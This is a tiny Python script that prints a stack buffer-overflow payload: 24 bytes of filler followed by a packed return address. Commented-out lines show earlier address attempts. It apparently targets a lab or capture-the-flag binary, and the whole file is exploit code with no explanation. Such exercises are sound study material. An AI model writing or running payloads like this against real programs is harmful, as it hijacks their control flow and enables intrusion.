#!/usr/bin/python
import sys
import struct
sys.stdout.write("1"*24)
#sys.stdout.write("1234")
#sys.stdout.write(struct.pack("!I", 0x400546))
sys.stdout.write(struct.pack("!I", 0x46054000))
